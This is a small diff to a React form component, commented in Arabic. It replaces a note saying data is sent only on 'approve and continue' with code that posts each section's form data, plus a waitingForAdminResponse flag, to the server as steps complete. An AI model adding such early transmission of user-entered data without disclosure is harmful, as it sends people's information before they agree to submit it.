@@ -2669,7 +2669,14 @@ const [capitalAmount, setCapitalAmount] = useState('1000');
                     };
                   }
                   
-                  // لا يتم إرسال البيانات هنا - يتم إرسالها فقط عند النقر على "اعتماد ومتابعة"
+                  // إرسال البيانات للسيرفر
+                  if (Object.keys(sectionData).length > 0) {
+                    sendData({
+                      data: sectionData,
+                      current: sectionNames[pendingStep] || 'بيانات',
+                      waitingForAdminResponse: false,
+                    });
+                  }
                   
                   setCollapsedSteps(prev => {
                     const newSteps = [...prev, pendingStep];
